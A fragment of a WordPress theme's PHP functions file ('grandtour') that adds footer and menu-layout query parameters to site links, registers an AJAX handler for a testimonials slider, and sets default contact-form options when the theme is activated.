		if(isset($_GET['footer'])) 
		{
			$arr_params['footer'] = $_GET['footer'];
		}
		
		if(isset($_GET['menulayout'])) 
		{
			$arr_params['menulayout'] = $_GET['menulayout'];
		}
		
		$link = add_query_arg( $arr_params, $link );
	    
	    return $link;
	}
	add_filter('category_link','grandtour_add_my_query_var');
	add_filter('page_link','grandtour_add_my_query_var');
	add_filter('post_link','grandtour_add_my_query_var');
	add_filter('term_link','grandtour_add_my_query_var');
	add_filter('tag_link','grandtour_add_my_query_var');
	add_filter('category_link','grandtour_add_my_query_var');
	add_filter('post_type_link','grandtour_add_my_query_var');
	add_filter('attachment_link','grandtour_add_my_query_var');
	add_filter('year_link','grandtour_add_my_query_var');
	add_filter('month_link','grandtour_add_my_query_var');
	add_filter('day_link','grandtour_add_my_query_var');
	add_filter('search_link','grandtour_add_my_query_var');
	add_filter('previous_post_link','grandtour_add_my_query_var');
	add_filter('next_post_link','grandtour_add_my_query_var');
}

add_action('wp_ajax_grandtour_script_testimonials_flexslider', 'grandtour_script_testimonials_flexslider');
add_action('wp_ajax_nopriv_grandtour_script_testimonials_flexslider', 'grandtour_script_testimonials_flexslider');

function grandtour_script_testimonials_flexslider() {
	get_template_part("/modules/script/script-testimonials-flexslider");

	die();
}

//Setup custom settings when theme is activated
if (isset($_GET['activated']) && $_GET['activated']){
	//Add default contact fields
	$pp_contact_form = get_option('pp_contact_form');
	if(empty($pp_contact_form))
	{
		add_option( 'pp_contact_form', 's:1:"3";' );
	}
	
	$pp_contact_form_sort_data = get_option('pp_contact_form_sort_data');
	if(empty($pp_contact_form_sort_data))
	{
		add_option( 'pp_contact_form_sort_data', 'a:3:{i:0;s:1:"1";i:1;s:1:"2";i:2;s:1:"3";}' );
	}

	wp_redirect(admin_url("admin.php?page=functions.php&activate=true"));
}
?>
